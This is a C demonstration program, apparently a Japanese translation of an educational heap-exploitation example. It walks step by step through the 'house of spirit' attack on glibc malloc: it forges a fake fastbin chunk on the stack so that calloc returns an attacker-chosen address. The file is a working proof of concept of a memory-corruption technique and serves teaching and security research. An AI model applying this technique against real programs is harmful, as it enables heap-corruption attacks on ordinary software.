#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	puts("このファイルは house of spirit 攻撃を示します。");
	puts("この攻撃は、ヒープ以外のポインタを fastbin に追加し、(ほぼ)任意の場所への書き込みにつなげます。");
	puts("必要なプリミティブ (primitive): 既知の対象アドレス、対象メモリの先頭と末尾を設定できること");

	puts("\nステップ 1: 7 個のチャンクを確保して解放し、tcache を埋めます");
	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {
		free(chunks[i]);
	}

	puts("\nステップ 2: 偽のチャンクを用意します");
	// これは fastbinsY とは無関係です(10 という数字にだまされないでください)。fake_chunks は、確保要求を満たすための単なるメモリ領域です(fastbinsY から指されます)
	long fake_chunks[10] __attribute__ ((aligned (0x10)));
	printf("対象の偽チャンクは %p にあります\n", fake_chunks);
	printf("これには 2 つのチャンクが含まれます。1 つ目は %p から、2 つ目は %p から始まります。\n", &fake_chunks[1], &fake_chunks[9]);
	printf("この領域の chunk.size は、(チャンクのデータを収めるため)領域より 16 大きくする必要があり、かつ fastbin の範囲(x64 では 128 以下)に収まっている必要があります。fastbin サイズのチャンクでは、free は PREV_INUSE (最下位ビット) を無視しますが、IS_MMAPPED (下位から 2 番目のビット) と NON_MAIN_ARENA (下位から 3 番目のビット) は問題を引き起こします。\n");
	puts("... なお、これは次の malloc 要求のサイズを、malloc の実装が内部で使うサイズに丸めたものである必要があります。例えば x64 では、0x30 から 0x38 はすべて 0x40 に丸められるので、最後の malloc の引数としてはどれも使えます。");
	printf("ここでチャンク (%p) の size を 0x40 に設定して、malloc に有効なチャンクだと思い込ませます。\n", &fake_chunks[1]);
	fake_chunks[1] = 0x40; // これが size です

	printf("*次の* 偽の領域の chunk.size は、妥当な値である必要があります。つまり、nextsize の整合性チェックを通すために、2*SIZE_SZ より大きく (x64 では 16 より大きく)、かつ av->system_mem より小さい (main arena ではデフォルトで 128kb 未満) 必要があります。fastbin のサイズである必要はありません。\n");
	printf("1 つ目のチャンクの解放が成功するように、チャンク (%p) の size を 0x1234 に設定します。\n", &fake_chunks[9]);
	fake_chunks[9] = 0x1234; // nextsize(次のチャンクの size)

	puts("\nステップ 3: 1 つ目の偽チャンクを解放します");
	puts("偽チャンクのアドレスは 16 バイトにアラインされている必要があることに注意してください。\n");
	void *victim = &fake_chunks[2];
	free(victim);

	puts("\nステップ 4: 偽チャンクを取り出します");
	puts("まず tcache を空にする必要があります。");
	for(int i=0; i<7; i++) {
		malloc(0x30);
	}

	printf("これで、次の calloc (または malloc) は、%p にある偽チャンクを返します!\n", &fake_chunks[2]);
	void *allocated = calloc(1, 0x30);
	printf("malloc(0x30): %p、偽チャンク: %p\n", allocated, victim);

	assert(allocated == victim);
}
